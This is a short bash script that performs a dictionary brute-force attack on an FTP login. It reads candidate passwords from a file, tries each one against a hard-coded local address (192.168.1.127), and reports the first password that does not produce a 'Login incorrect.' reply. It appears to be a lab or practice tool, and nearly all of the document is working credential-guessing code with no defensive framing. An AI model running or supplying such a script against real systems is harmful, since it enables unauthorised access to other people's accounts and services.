#!/bin/bash

# add -x option to debug script
# /bin/bash -x

if [ $# -lt 2 ]
then
	echo "Wrong number of arguments. Usage:"
	echo "	$0 user password_list_file"
	exit 1
fi

username=$1
passwordfile=$2
outputfile="ftp_output.txt"
searchmessage="Login incorrect."

while read password;
do
	echo "trying $username / $password"
	
	ftp ftp://$username:$password@192.168.1.127 >$outputfile 2>/dev/null
	
	numlines=$(grep "$searchmessage" $outputfile | wc -l)
	echo "numero de lineas: $numlines"

	if [ $numlines -eq 0 ]
	then
		echo found: user $username, password $password
		exit 0
	fi

done < $passwordfile

echo no password found for user $username in file $passwordfile
exit 1
